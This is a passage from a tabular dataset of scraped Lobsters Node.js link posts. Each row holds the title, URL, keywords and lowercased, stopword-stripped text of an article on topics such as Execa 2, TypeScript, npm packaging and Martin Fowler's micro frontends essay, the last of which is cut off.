97,Lobsters,nodejs,Node.js programming,Getting into Node.js from Delphi,https://jonlennartaasenden.wordpress.com/2019/07/01/getting-into-node-js-from-delphi/,getting nodejs delphi,delphi score quite well tiobe index javascript without javascript gopherjs tardisgo n basic javascript asmjs webassembly webassembly kit strategy setting common tool visual studio code typescript assemblyscript nodejs adobe phonegap visual studio visual studio npm book glorious book mazon ton great book element come webassembly like,delphi one best development toolchains window avid fan delphi since first released turbo pascal delphi healthy following despite popular belief delphi score quite well tiobe index cool efficient delphi might situation native code wont work least le efficient alternative delphi broad wingspan lowlevel assembler way class generic javascript emerging web technology based completely different philosophy one native code regarded negative since bind hardware getting grip whole javascript phenomenon mobile embedded backend service daunting know native code thankfully alternative help become productive quickly something brush post javascript without javascript dig tool trade want cover alternative way enjoying power nodejs javascript namely using compiler convert code traditional language emit fully working javascript lot option think quartex medium desktop complete environment written purely javascript server cluster frontend pure javascript good example done swift compiles javascript apple amazing thing new sexy swiftui tookit know way around swift compile javascript go likewise compiled j remobjects element support go language element target native llvm net java webassembly gopherjs tardisgo cc compiled asmjs courtesy emscripten us clang first compile code llvm bitcode convert asmjs probably seen game like quake run browser asmjs kind precursor webassembly n basic compiles javascript visual basic style environment ide even coming straight delphi couple option pick freepascal project dwscript compiles code javascript compiler used smart pascal earlier oxygene next generation objectpascal remobjects compiles webassembly far best option javascript asmjs webassembly asmjs far misunderstood technology javascript ecosystem let cover move year back javascript gained support memory buffer typed array might sound exciting term speed difference tremendous default variable type javascript delphi developer know variant assumes datatype value assign needle say lot overhead working variant javascript suddenly getting proper typed array huge deal discovered javascript could manipulate array buffer high speed providing used subset language subset javascript runtime could jit compile easily turn machinecode emscripten team implement bytecode based virtualmachine javascript compile cc bytecodes know huge project result speak webassembly fast got javascript webassembly webassembly different vanilla javascript asmjs first executed high speed browser like asmjs bytecodes executed javascript code water fast slick platform independent ide element ide o x called fire use remobjects element either visual studio water secondly webassembly completely jit compiled browser nodejs loading like asmjs part compiled others interpreted webassembly run full speed nothing traditional javascript actually completely separate engine option table webassembly technology best performance kit strategy first thing need clear want work need requirement game developer different system service developer couple kit think mobile developer implement mobile application using oxygene compiling webassembly element remobjects remoting sdk client server communication use freepascal vanilla javascript scaffolding needed service developer implement library oxygene benefit speed webassembly use remobjects data abstract make dataaccess uniform fast use freepascal boilerplate nodejs logic desktop developer platform independent desktop application webassembly way go need scaffolding plain javascript communicate application host code better webassembly use cordova phonegap bundle webassembly file cs styling single final executable important part think getting javascript look closely benefit limitation technology webassembly fast wicked fast let write code like used delphi thing like pointer etc supported element mean ordinary code use pointer port ease also bound handandfeet particular framework example emscripten cc almost nothing term ui functionality visual part custom build sdl simple directmedia layer fake graphic onto ordinary canvas make emscripten good candidate porting game written cc web le optimal writing serious application setting common tool far looked couple alternative getting wonderful world javascript lieu language want get started typical tool j developer use visual studio code pretty amazing codeeditor first must visual studio code actually great example achieve javascript entire editor program written javascript want stress editor editor get way work file j different delphi c java javascript project often fragmented le code file organized name typescript invented anders hejlsberg also made delphi c next must without doubt typescript personally im fond typescript ordinary javascript make head hurt want class ordinary inheritance typescript step next list assemblyscript postprocessor typescript convert code webassembly lack much charm elegance oxygene suspect old habit reading objectpascal year feel home also need install nodejs runtime engine running javascript service nodejs heavily optimized writing server software actually brilliant way write service multiplatform nodejs delivers behavior regardless underlying operating system finally since definitely want convert javascript andor webassembly standalone executable need adobe phonegap visual studio matter want enter javascript via element something else visual studio save lot time especially plan targeting azure amazon service downloading installing community edition good idea use exploring option come writing system service also want check npm nodejs package manager javascript ecosystem heavily package oriented npm give package play free charge clear npm shell command use install remove package npm also online repository said package search find need package hosted github install package locally application folder npm figure dependency etc automatically book glorious book last least get good book seriously save much time frustration amazon ton great book vanilla javascript typescript nodejs pick good one take time consume material strongly urge look element come webassembly webassembly harsh barren canvas able use element rtl huge boost regardless path pick always benefit learning vanilla javascript like like loading related
98,Lobsters,nodejs,Node.js programming,npm 6.9.1 is broken due to .git folder in published tarball,https://npm.community/t/npm-6-9-1-is-broken-due-to-git-folder-in-published-tarball/8454,npm broken due git folder published tarball,following setup guide,bug amazing forgive always weirdly excited twisty corner case npm publish ignores git folder default force file named readme forced include override exclude remote branch named go git folder get included publish permanently borks npm install eisgit turn restriction afaik entirely vestigial copied forward earlier version npm without clear insight want restriction first place suspect potential introduced tar rewrite never happened one publishing git repo remote ref like either luck following setup guide recommends using separate copy repo publication gon na brutal fix though cause facility existing version fix scenario would fallback npxable thing remove git folder communicating gon na rough
99,Lobsters,nodejs,Node.js programming,Execa 2 release — process execution for humans,https://medium.com/@ehmicky/execa-v2-20ffafeedfdf,execa release process execution human,execa release process execution human new major version execa child process sindre sorhus ehmicky gmartigny bendingbender tomsotte malik ammar faisal stroncium satya rohith brad lemley coreyfarrell brandon smith thai pangsakulyanont pedro augusto de paula barbosa typescript interleaved stdout stderr stdout stderr combined output avoid shell option shell execacommand execacommandsync change local binary execution improved spawning nodejs script execanode childprocessfork nodepath nodeoptions graceful exit sigterm childprocesskill sigkill forcekillaftertimeout process cancellation support childprocesskill property enhanced error better error stricter exit code exitcode exitcodename gulp plugin gulp execa breaking change stripfinalnewline command stdout stderr update windowshide maxbuffer full changelog,execa release process execution humanstoday releasing new major version execa nodejs library enhances child process thanks sindre sorhus ehmicky gmartigny bendingbender tomsotte malik ammar faisal stroncium satya rohith brad lemley coreyfarrell brandon smith thai pangsakulyanont pedro augusto de paula barbosa following feature available typescriptwe added typescript declarationsinterleaved stdout stderrnodejs return child process stdout stderr separately however stream usually connected intertwined console made easy retrieve combined outputavoid shell optionwhile legitimate us shell option avoidedwhy first encourages shellspecific syntax bash cmdexe work every o almost every shell feature available directly nodejssecond much slower make every command go shell interpreterlast least increase risk command injection consequence removed execashell execashellsync merely shortcut shell optionfurthermore execacommand execacommandsync used specify command argument single string without shell option nothing need escapedquoted except significant space backslash change local binary executionthe preferlocal option default false executing locally installed binary need specify preferlocal true optionimproved spawning nodejs scriptswe added execanode like childprocessfork executes nodejs script child processit us current node version option overridden using nodepath nodeoptionsflagsgraceful exitsome process handle sigterm signal order cleanup resource exit gracefully might take long time even never finish childprocesskill sends sigkill signal second prevent configured using forcekillaftertimeout optionprocess cancellationcancelling child process execution common added support behaves like childprocesskill better error message propertiesenhanced errorswe improved error message property nodejs child process error contain le information scattered several event execa produce better error stricter exit codespreviously exit code could either number string property removed favor exitcode number exitcodename string gulp pluginexecute command gulpjs gulp execa thin wrapper around execa add gulpspecific feature related verbosity output error streamingmore breaking changesnodejs support droppedthe stripeof option renamed stripfinalnewline cmd property commandexecastdout execastderr removed since directly use stdout stderr property resolved valueother updatesthe windowshide option always true ensures window pop windowsthe maxbuffer option default value increased mb mbseveral bug also fixedfor information check full changelog
100,Lobsters,nodejs,Node.js programming,node-ally - A collection of express middleware helpers,https://github.com/Grantlyk/node-ally,nodeally collection express middleware helper,nodeally installation usage example using enable cors route use development setup release history meta grantlyk grant nespiteio http githubcomgrantlyknodeally contributing http githubcomyournameyourprojectfork,nodeally collection express middleware helper nodeally small library middleware function find useful installation npm install nodeally save usage example nodeally extremely small easy use library currently contains four middleware function function follows errorhandler error handler used capture error thrown nodejs application return message status code based thrown error server response enablecors middleware function enabled cross origin request notfound middleware function return appropriate error client hit endpoint nt exist api requesttime middleware record time request put req object import express express import errorhandler enablecors notfound requesttime nodeally const app express appuse enablecors appuse notfound appuse errorhandler appuse requesttime export default app supportcrossorigin used preflight request browser currently return preflight request also telling browser accepts cross origin request using enable cors route use import express express import supportcrossorigin nodeally const router expressrouter routeroptions helloworld supportcrossorigin routerpost helloworld req re next resstatus send hello world export default router development setup want setup nodeally development going need get repo onto local machine forking cloning machine rest setup pretty simple need install dependency npm install check everything working npm test current node version used found travisyml release history add added middleware function added current time req object add added readme file add added travis ci project change modified bundle indexjs rather indexjs indextestjs final build fix removed deprecated prepublish npm script initial version project meta grant leadbetter grantlyk grant nespiteio distributed mit license see license information http githubcomgrantlyknodeally contributing fork http githubcomyournameyourprojectfork create feature branch git checkout b featurefoobar add change including test commit change git commit add foobar push branch git push origin featurefoobar create new pull request ensure ci build pass
101,Lobsters,nodejs,Node.js programming,Make fewer JS mistakes with TypeScript,https://superjavascript.com/t/typescript/,make fewer j mistake typescript,make fewer j mistake typescript javascript problem solution online typescript compiler escape hatch summary jobalerts sign maximise opportunity see also,make fewer j mistake typescript javascript j originally intended make small alteration web page spinning animation scroll email symbol validate typed email address correctly year since j used complex thing example used called single page application like traditional desktop application delivered web browser first famous application like google gmail nodejs released letting developer write j code run server provide backends website backends required create dynamic website allow people log store information communicate traditionally would written language like java c ruby python nodejs became popular part use programming language j web page back end github released electron toolkit creating traditional desktop application using guessed javascript electron based web technology html cs javascript write web reused electron however electron give developer access resource user computer local file camera sound javascript usage evolving simple website tweak language used everywhere shown sign strain keeping different version javascript released modernise language however version javascript suffer problem make hard manage larger program problem solved typescript javascript problem problem javascript us dynamic typing mean mean write code flexibility use object array etc way see fit error time write code compile sound like great thing right well catch still get error run program late make thing worse error uncovered rare situation situation user program might find test illustrate problem imagine variable passed function called honestlyimastring variable could string probably could anything including undefined null number number like number number like nan infinity array object array first value object second nan assume value string start thing like findreplace program error another piece code pass array likely mistake yes perhaps someone else writing code call function know could programmer revisiting code month ago making mistake lot function variable keep track sort mistake could even happen programmer writes function code us day program get larger function object easy lose track function expect example pas object coordinate x x expected property expecting array one easy make mistake somewhere often find late program used user call problem solution solution static typing define type variable write program run program compiler check misused type honestlyimastring example mean would told run program error someone trying pas array function want string coordinate example define object x try get x get error compiler fix even run program first time typescript provides ability define type variable program work writing program typescript language like javascript allows annotate variable type typescript program compiled javascript tool called tsc typescript compiler process check made mistake example le look typescript function take string add full stop period end function addperiod sentence string return sentence difference javascript equivalent type annotation string argument function tell typescript compiler string expected two effect one know sentence string check whatever function valid string case appending another string fine secondly check code calling function passing string something else check fails fail compile javascript know run program problem another interesting thing typescript code figure always return string know know sentence string appending another string returning code call addperiod put result variable typescript know variable string example following code give error trying compile let result addperiod sentence result result error message look like viewed online typescript compiler escape hatch nice thing typescript sometimes cheat use like good ol javascript javascript excellent dealing response server may differently formatted data missing data etc good treat response like javascript object call property like without define advance ask something defined value undefined value well known javascript example get object result soccer game call say teamagoals teambgoals see score later change response also include information time game easily change program process typescript declare variable type allow treat like classic javascript unknown type probe see property example let serverresponse color red number say red consolelog serverresponsecolor say undefined consolelog serverresponseshapes example compile even though referring shape typescript compiler could otherwise tell part serverresponse object summary scratched surface typescript programming language allows write javascript program additional safety check make fewer mistake javascript program looking javascript job tech job created free service called jobalerts grab job around world remote job onsite job technology tonne trusted source sign maximise opportunity see also
102,Lobsters,nodejs,Node.js programming,Wrap a function without changing its name/properties (by sindresorhus),https://github.com/sindresorhus/mimic-fn,wrap function without changing nameproperties sindresorhus,install usage api mimicfn option option nonconfigurable property related,make function mimic another one useful wrap function another function like preserve original name property install npm install mimicfn usage const mimicfn require mimicfn function foo foounicorn function wrapper return foo consolelog wrappername wrapper mimicfn wrapper foo consolelog wrappername foo consolelog wrapperunicorn consolelog string wrapper wrapped wrapper nfunction foo api mimicfn option modifies function mimic function return function name displayname property copied length property copied prototype class inherited property copied totostring return fromtostring prepended wrapped comment type function mimicking function type function function mimic option type object ignorenonconfigurable type boolean default false skip modifying nonconfigurable property instead throwing error related
103,Lobsters,nodejs,Node.js programming,Micro Frontends,https://martinfowler.com/articles/micro-frontends.html,micro frontends,microservices micro frontends benefit incremental upgrade peril strangle simple decoupled codebases bounded context pit success independent deployment autonomous team nutshell example integration approach serverside template composition buildtime integration runtime integration via iframes serverside includes option listed earlier runtime integration via javascript full example runtime integration via web component styling bem sas cs module cssinjs shadow dom shared component library foundation framework harvest custodian crossapplication communication custom event detail later consumerdriven contract backend communication bff testing test pyramid mentioned example detail integrate together using javascript http demomicrofrontendscom github container container mentioned previously react router micro frontends browse order crossapplication communication via routing mentioned earlier common content shared component library repository common content describe shortly external described earlier infrastructure centralised repository travis ci downside payload size direct relationship described environment difference operational governance complexity conclusion,recent year microservices exploded popularity many organisation using architectural style avoid limitation large monolithic backends much written style building serverside software many company continue struggle monolithic frontend codebases perhaps want build progressive responsive web application ca nt find easy place start integrating feature existing code perhaps want start using new javascript language feature one myriad language compile javascript ca nt fit necessary build tool existing build process maybe want scale development multiple team work single product simultaneously coupling complexity existing monolith mean everyone stepping toe real problem negatively affect ability efficiently deliver high quality experience customer lately seeing attention paid overall architecture organisational structure necessary complex modern web development particular seeing pattern emerge decomposing frontend monolith smaller simpler chunk developed tested deployed independently still appearing customer single cohesive product call technique micro frontends define architectural style independently deliverable frontend application composed greater whole november issue thoughtworks technology radar listed micro frontends technique organisation ass later promoted trial finally adopt mean see proven approach using make sense figure micro frontends appeared tech radar several time key benefit seen micro frontends smaller cohesive maintainable codebases scalable organisation decoupled autonomous team ability upgrade update even rewrite part frontend incremental fashion previously possible coincidence headlining advantage one microservices provide course free lunch come software architecture everything come cost micro frontend implementation lead duplication dependency increasing number byte user must download addition dramatic increase team autonomy cause fragmentation way team work nonetheless believe risk managed benefit micro frontends often outweigh cost benefit rather defining micro frontends term specific technical approach implementation detail instead place emphasis attribute emerge benefit give incremental upgrade many organisation beginning micro frontends journey old large frontend monolith held back yesteryear tech stack code written delivery pressure getting point total rewrite tempting order avoid peril full rewrite much prefer strangle old application piece piece meantime continue deliver new feature customer without weighed monolith often lead towards micro frontends architecture one team experience getting feature way production little modification old world team want join new world well existing code still need maintained case may make sense continue add new feature choice available endgame afforded freedom make casebycase decision individual part product make incremental upgrade architecture dependency user experience major breaking change main framework micro frontend upgraded whenever make sense rather forced stop world upgrade everything want experiment new technology new mode interaction isolated fashion could simple decoupled codebases source code individual micro frontend definition much smaller source code single monolithic frontend smaller codebases tend simpler easier developer work particular avoid complexity arising unintentional inappropriate coupling component know drawing thicker line around bounded context application make harder accidental coupling arise course single highlevel architectural decision ie let micro frontends substitute good old fashioned clean code trying exempt thinking code putting effort quality instead trying set fall pit success making bad decision hard good one easy example sharing domain model across bounded context becomes difficult developer le likely similarly micro frontends push explicit deliberate data event flow different part application something anyway independent deployment microservices independent deployability micro frontends key reduces scope given deployment turn reduces associated risk regardless frontend code hosted micro frontend continuous delivery pipeline build test deploys way production able deploy micro frontend little thought given current state codebases pipeline nt matter old monolith fixed manual quarterly release cycle team next door pushed halffinished broken feature master branch given micro frontend ready go production able decision team build maintain figure micro frontend deployed production independently autonomous team higherorder benefit decoupling codebases release cycle get long way towards fully independent team section product ideation production beyond team full ownership everything need deliver value customer enables move quickly effectively work team need formed around vertical slice business functionality rather around technical capability easy way carve product based end user see micro frontend encapsulates single page application owned endtoend single team brings higher cohesiveness team work team formed around technical horizontal concern like styling form validation figure application owned single team nutshell short micro frontends slicing big scary thing smaller manageable piece explicit dependency technology choice codebases team release process able operate evolve independently without excessive coordination example imagine website customer order food delivery surface fairly simple concept surprising amount detail want well landing page customer browse search restaurant restaurant searchable filterable number attribute including price cuisine customer ordered previously restaurant need page show menu item allows customer choose want eat discount meal deal special request customer profile page see order history track delivery customise payment option figure food delivery website may several reasonably complex page enough complexity page could easily justify dedicated team one team able work page independently team able develop test deploy maintain code without worrying conflict coordination team customer however still see single seamless website throughout rest article using example application wherever need example code scenario integration approach given fairly loose definition many approach could reasonably called micro frontends section show example discus tradeoff fairly natural architecture emerges across approach generally micro frontend page application single container application render common page element header footer address crosscutting concern like authentication navigation brings various micro frontends together onto page tell micro frontend render figure usually derive architecture visual structure page serverside template composition start decidedly unnovel approach frontend development rendering html server multiple template fragment indexhtml contains common page element us serverside includes plug pagespecific content fragment html file html lang en dir ltr head meta charset title feed title head body feed include file pagehtml body html serve file using nginx configuring page variable matching url requested server listen servername localhost root usrsharenginxhtml index indexhtml ssi redirect browse rewrite http redirect decide html fragment insert based url location browse set page browse location order set page order location profile set page profile location render indexhtml errorpage indexhtml fairly standard serverside composition reason could justifiably call micro frontends split code way piece represents selfcontained domain concept delivered independent team shown various html file end web server assumption deployment pipeline allows u deploy change one page without affecting thinking page even greater independence could separate server responsible rendering serving micro frontend one server front make request others careful caching response could done without impacting latency figure server built deployed independently example show micro frontends necessarily new technique complicated long careful design decision affect autonomy codebases team achieve many benefit regardless tech stack buildtime integration one approach sometimes see publish micro frontend package container application include library dependency container packagejson might look example app name feedmecontainer version description food delivery web app dependency feedmebrowserestaurants feedmeorderfood feedmeuserprofile first seems make sense produce single deployable javascript bundle usual allowing u deduplicate common dependency various application however approach mean recompile release every single micro frontend order release change individual part product microservices seen enough pain caused lockstep release process would recommend strongly kind approach micro frontends gone trouble dividing application discrete codebases developed tested independently let reintroduce coupling release stage find way integrate micro frontends runtime rather buildtime runtime integration via iframes one simplest approach composing application together browser humble iframe nature iframes make easy build page independent subpages also offer good degree isolation term styling global variable interfering html head title feed title head body welcome feed iframe id microfrontendcontainer iframe script type textjavascript const microfrontendsbyroute http browseexamplecomindexhtml orderfood http orderexamplecomindexhtml userprofile http profileexamplecomindexhtml const iframe documentgetelementbyid microfrontendcontainer iframesrc microfrontendsbyroute windowlocationpathname script body html serverside includes option building page iframes new technique perhaps seem exciting revisit chief benefit micro frontends listed earlier iframes mostly fit bill long careful slice application structure team often see lot reluctance choose iframes reluctance seem driven gut feel iframes bit yuck good reason people avoid easy isolation mentioned tend make le flexible option difficult build integration different part application make routing history deeplinking complicated present extra challenge making page fully responsive runtime integration via javascript next approach describe probably flexible one one see team adopting frequently micro frontend included onto page using script tag upon load expose global function entrypoint container application determines micro frontend mounted call relevant function tell micro frontend render html head title feed title head body welcome feed script nt render anything immediately instead attach entrypoint function window script src http browseexamplecombundlejs script script src http orderexamplecombundlejs script script src http profileexamplecombundlejs script div id microfrontendroot div script type textjavascript global function attached window script const microfrontendsbyroute windowrenderbrowserestaurants orderfood windowrenderorderfood userprofile windowrenderuserprofile const renderfunction microfrontendsbyroute windowlocationpathname determined entrypoint function call giving id element render renderfunction microfrontendroot script body html obviously primitive example demonstrates basic technique unlike buildtime integration deploy bundlejs file independently unlike iframes full flexibility build integration micro frontends however like could extend code many way example download javascript bundle needed pas data rendering micro frontend flexibility approach combined independent deployability make default choice one seen wild often explore detail get full example runtime integration via web component one variation previous approach micro frontend define html custom element container instantiate instead defining global function container call html head title feed title head body welcome feed script nt render anything immediately instead define custom element type script src http browseexamplecombundlejs script script src http orderexamplecombundlejs script script src http profileexamplecombundlejs script div id microfrontendroot div script type textjavascript element type defined script const webcomponentsbyroute microfrontendbrowserestaurants orderfood microfrontendorderfood userprofile microfrontenduserprofile const webcomponenttype webcomponentsbyroute windowlocationpathname determined right web component custom element type create instance attach document const root documentgetelementbyid microfrontendroot const webcomponent documentcreateelement webcomponenttype rootappendchild webcomponent script body html end result quite similar previous example main difference opting thing web component way like web component spec like idea using capability browser provides good option prefer define interface container application micro frontends might prefer previous example instead styling cs language inherently global inheriting cascading traditionally module system namespacing encapsulation feature exist browser support often lacking micro frontends landscape many problem exacerbated example one team micro frontend stylesheet say color black another one say color blue selector attached page someone going disappointed new problem made worse fact selector written different team different time code probably split across separate repository making difficult discover year many approach invented make cs manageable choose use strict naming convention bem ensure selector apply intended others preferring rely developer discipline alone use preprocessor sas whose selector nesting used form namespacing newer approach apply style programatically cs module one various cssinjs library ensures style directly applied place developer intends platformbased approach shadow dom also offer style isolation approach pick matter much long find way ensure developer write style independently confidence code behave predictably composed together single application shared component library mentioned visual consistency across micro frontends important one approach develop library shared reusable ui component general believe good idea although difficult well main benefit creating library reduced effort reuse code visual consistency addition component library serve living styleguide great point collaboration developer designer one easiest thing get wrong create many component early tempting create foundation framework common visuals needed across application however experience tell u difficult impossible guess component apis realworld usage result lot churn early life component reason prefer let team create component within codebases need even cause duplication initially allow pattern emerge naturally component api become obvious harvest duplicate code shared library confident something proven obvious candidate sharing dumb visual primitive icon label button also share complex component might contain significant amount ui logic autocompleting dropdown search field sortable filterable paginated table however careful ensure shared component contain ui logic business domain logic domain logic put shared library creates high degree coupling across application increase difficulty change example usually try share producttable would contain sort assumption exactly product one behave domain modelling business logic belongs application code micro frontends rather shared library shared internal library tricky question around ownership governance one model say shared asset everyone owns though practice usually mean one owns quickly become hodgepodge inconsistent code clear convention technical vision extreme development shared library completely centralised big disconnect people create component people consume best model seen one anyone contribute library custodian person team responsible ensuring quality consistency validity contribution job maintaining shared library requires strong technical skill also people skill necessary cultivate collaboration across many team crossapplication communication one common question regarding micro frontends let talk general recommend communicate little possible often reintroduces sort inappropriate coupling seeking avoid first place said level crossapp communication often needed custom event allow micro frontends communicate indirectly good way minimise direct coupling though make harder determine enforce contract exists micro frontends alternatively react model passing callback data downwards case downwards container application micro frontends also good solution make contract explicit third alternative use address bar communication mechanism explore detail later whatever approach choose want micro frontends communicate sending message event avoid shared state like sharing database across microservices soon share data structure domain model create massive amount coupling becomes extremely difficult make change styling several different approach work well important thing think long hard sort coupling introducing maintain contract time integration microservices wo nt able make breaking change integration without coordinated upgrade process across different application team also think automatically verify integration break functional testing one approach prefer limit number functional test write due cost implementing maintaining alternatively could implement form consumerdriven contract micro frontend specify requires micro frontends without needing actually integrate run browser together backend communication separate team working independently frontend application backend development believe strongly value fullstack team application development visual code way api development database infrastructure code one pattern help bff pattern frontend application corresponding backend whose purpose solely serve need frontend bff pattern might originally meant dedicated backends frontend channel web mobile etc easily extended mean backend micro frontend lot variable account bff might self contained business logic database might aggregator downstream service downstream service may may make sense team owns micro frontend bff also service micro frontend one api talk api fairly stable may much value building bff guiding principle team building particular micro frontend nt wait team build thing every new feature added micro frontend also requires backend change strong case bff owned team figure many different way structure frontendbackend relationship another common question user micro frontend application authenticated authorised server obviously customer authenticate auth usually fall firmly category crosscutting concern owned container application container probably sort login form obtain sort token token would owned container injected micro frontend initialisation finally micro frontend send token request make server server whatever validation required testing nt see much difference monolithic frontends micro frontends come testing general whatever strategy using test monolithic frontend reproduced across individual micro frontend micro frontend comprehensive suite automated test ensure quality correctness code obvious gap would integration testing various micro frontends container application done using preferred choice functionalendtoend testing tool selenium cypress nt take thing far functional test cover aspect tested lower level test pyramid mean use unit test cover lowlevel business logic rendering logic use functional test validate page assembled correctly example might load fullyintegrated application particular url assert hardcoded title relevant micro frontend present page user journey span across micro frontends could use functional testing cover keep functional test focussed validating integration frontends internal business logic micro frontend already covered unit test mentioned consumerdriven contract help directly specify interaction occur micro frontends without flakiness integration environment functional testing example detail rest article detailed explanation one way example application implemented focus mostly container application micro frontends integrate together using javascript probably interesting complex part see end result deployed live http demomicrofrontendscom full source code seen github figure browse landing page full micro frontends demo application demo built using reactjs worth calling react monopoly architecture micro frontends implemented many different tool framework chose react popularity familiarity container start container entry point customer let see learn packagejson name microfrontendsdemocontainer description entry point container micro frontends demo script start reactapprewired start build reactapprewired build test reactapprewired test dependency react reactdom reactrouterdom reactscripts devdependencies enzyme jestenzyme reactapprewiremicrofrontends reactapprewired configoverridespath nodemodulesreactapprewiremicrofrontends dependency react reactscripts conclude reactjs application created createreactapp interesting mention micro frontends going compose together form final application specify library dependency heading path buildtime integration mentioned previously tends cause problematic coupling release cycle see select display micro frontend let look appjs use react router match current url predefined list route render corresponding component switch route exact path component browse route exact path restaurant id component restaurant route exact path random render random switch random component interesting redirects page randomly selected restaurant url browse restaurant component look like const browse history microfrontend history history name browse host browsehost const restaurant history microfrontend history history name restaurant host restauranthost case render microfrontend component aside history object become important later specify unique name application host bundle downloaded configdriven url something like http running locally http browsedemomicrofrontendscom production selected micro frontend appjs render microfrontendjs another react component class microfrontend extends reactcomponent render return main id thispropsname container rendering put container element page id unique micro frontend tell micro frontend render use react componentdidmount trigger downloading mounting micro frontend class componentdidmount const name host thisprops const scriptid microfrontendscript name documentgetelementbyid scriptid thisrendermicrofrontend return fetch host assetmanifestjson re resjson manifest const script documentcreateelement script scriptid scriptid scriptsrc host manifest mainjs scriptonload thisrendermicrofrontend documentheadappendchild script first check relevant script unique id already downloaded case render immediately fetch assetmanifestjson file appropriate host order look full url main script asset set script url left attach document onload handler render micro frontend class rendermicrofrontend const name history thisprops window render name name container history eg windowrenderbrowse browsecontainer history code calling global function called something like windowrenderbrowse put script downloaded pas id main element micro frontend render history object explain soon signature global function key contract container application micro frontends communication integration happen keeping fairly lightweight make easy maintain add new micro frontends future whenever want something would require change code think long hard mean coupling codebases maintenance contract one final piece handling cleanup microfrontend component unmounts removed dom want unmount relevant micro frontend corresponding global function defined micro frontend purpose call appropriate react lifecycle method class componentwillunmount const name thisprops window unmount name name container term content container render directly toplevel header navigation bar site constant across page cs element written carefully ensure style element within header nt conflict styling code within micro frontends end container application fairly rudimentary give u shell dynamically download micro frontends runtime glue together something cohesive single page micro frontends independently deployed way production without ever making change micro frontend container micro frontends logical place continue story global render function keep referring home page application filterable list restaurant whose entry point look like import react react import reactdom reactdom import app app import registerserviceworker registerserviceworker windowrenderbrowse containerid history reactdomrender app history history documentgetelementbyid containerid registerserviceworker windowunmountbrowse containerid reactdomunmountcomponentatnode documentgetelementbyid containerid usually reactjs application call reactdomrender would toplevel scope meaning soon script file loaded immediately begin rendering hardcoded dom element application need able control rendering happens wrap function receives dom element id parameter attach function global window object also see corresponding unmounting function used cleanup already seen function called micro frontend integrated whole container application one biggest criterion success develop run micro frontends independently micro frontend also indexhtml inline script render application standalone mode outside container html lang en head title restaurant order title head body main id container main script type textjavascript windowonload windowrenderrestaurant container script body html figure micro frontend run standalone application outside container point onwards micro frontends mostly plain old react apps browse application fetch list restaurant backend provides input element searching filtering restaurant render react router link element navigate specific restaurant point would switch second order micro frontend render single restaurant menu figure micro frontends interact via route change directly final thing worth mentioning micro frontends use styledcomponents styling cssinjs library make easy associate style specific component guaranteed micro frontend style leak effect container another micro frontend crossapplication communication via routing mentioned earlier crossapplication communication kept minimum example requirement browsing page need tell restaurant page restaurant load see use clientside routing solve problem three react application involved using react router declarative routing initialised two slightly different way container application create browserrouter internally instantiate history object history object glossing previously use object manipulate clientside history also use link multiple react router together inside micro frontends initialise router like router history thispropshistory case rather letting react router instantiate another history object provide instance passed container application router instance connected route change triggered reflected give u easy way pas parameter one micro frontend another via url example browse micro frontend link like link restaurant restaurantid link clicked route updated container see new url determine restaurant micro frontend mounted rendered micro frontend routing logic extract restaurant id url render right information hopefully example flow show flexibility power humble url aside useful sharing bookmarking particular architecture useful way communicate intent across micro frontends using page url purpose tick many box structure welldefined open standard globally accessible code page limited size encourages sending small amount data userfacing encourages structure model domain faithfully declarative imperative ie rather please thing force micro frontends communicate indirectly know depend directly using routing mode communication micro frontends route choose constitute contract case set stone idea restaurant viewed restaurant restaurantid ca nt change route without updating application refer given importance contract automated test check contract adhered common content want team micro frontends independent possible thing common wrote earlier shared component library help consistency across micro frontends small demo component library would overkill instead small repository common content including image json data cs served network micro frontends another thing choose share across micro frontends library dependency describe shortly duplication dependency common drawback micro frontends even though sharing dependency across application come set difficulty demo application worth talking done first step choose dependency share quick analysis compiled code showed bundle contributed react reactdom addition size two library core dependency know micro frontends benefit extracted finally stable mature library usually introduce breaking change across two major version crossapplication upgrade effort difficult actual extraction need mark library external webpack config rewiring similar one described earlier moduleexports config env configexternals react react reactdom reactdom return config add couple script tag indexhtml file fetch two library shared content server body noscript need enable javascript run app noscript div id root div script src reactappcontenthost script script src reactappcontenthost script body sharing code across team always tricky thing well need ensure share thing genuinely want common want change multiple place however careful share nt real benefit gained infrastructure application hosted aws core infrastructure bucket cloudfront distribution domain certificate etc provisioned using centralised repository terraform code micro frontend source repository continuous deployment pipeline travis ci build test deploys static asset bucket balance convenience centralised infrastructure management flexibility independent deployability note micro frontend container get bucket mean free reign go nt need worry object name collision conflicting access management rule another team application downside start article mentioned tradeoff micro frontends architecture benefit mentioned come cost cover payload size independentlybuilt javascript bundle cause duplication common dependency increasing number byte send network end user example every micro frontend includes copy react forcing customer download react n time direct relationship page performance user engagementconversion much world run internet infrastructure much slower highlydeveloped city used many reason care download size issue easy solve inherent tension desire let team compile application independently work autonomously desire build application way share common dependency one approach externalise common dependency compiled bundle described demo application soon go path though reintroduced buildtime coupling micro frontends implicit contract say must use exact version dependency breaking change dependency might end needing big coordinated upgrade effort oneoff lockstep release event everything trying avoid micro frontends first place inherent tension difficult one bad news firstly even choose nothing duplicate dependency possible individual page still load faster built single monolithic frontend reason compiling page independently effectively implemented form code splitting classic monolith page application loaded often download source code dependency every page building independently single pageload download source dependency page may result faster initial pageloads slower subsequent navigation user forced redownload dependency page disciplined bloating micro frontends unnecessary dependency know user generally stick one two page within application may well achieve net gain performance term even duplicated dependency lot may possibly previous paragraph highlight fact every application always unique performance characteristic want know sure performance impact particular change substitute taking realworld measurement ideally production seen team agonise extra kilobyte javascript go download many megabyte highresolution image run expensive query slow database important consider performance impact every architectural decision sure know real bottleneck environment difference able develop single micro frontend without needing think micro frontends developed team may even able run micro frontend standalone mode blank page rather inside container application house production make development lot simpler especially real container complex legacy codebase often case using micro frontends gradual migration old world new however risk associated developing environment quite different production developmenttime container behaves differently production one may find micro frontend broken behaves differently deploy production particular concern global style may brought along container micro frontends solution different situation worry environmental difference developing locally environment productionlike need ensure regularly integrate deploy micro frontend environment like production testing manual automated environment catch integration issue early possible completely solve problem ultimately another tradeoff weigh productivity boost simplified development environment worth risk integration issue answer depend project operational governance complexity final downside one direct parallel microservices distributed architecture micro frontends inevitably lead stuff manage repository tool builddeploy pipeline server domain etc adopting architecture question consider enough automation place feasibly provision manage additional required infrastructure frontend development testing release process scale many application comfortable decision around tooling development practice becoming decentralised le controllable ensure minimum level quality consistency governance across many independent frontend codebases could probably fill another entire article discussing topic main point wish make choose micro frontends definition opting create many small thing rather one large thing consider whether technical organisational maturity required adopt approach without creating chaos conclusion frontend codebases continue get complex year see growing need scalable architecture need able draw clear boundary establish right level coupling cohesion technical domain entity able scale software delivery across 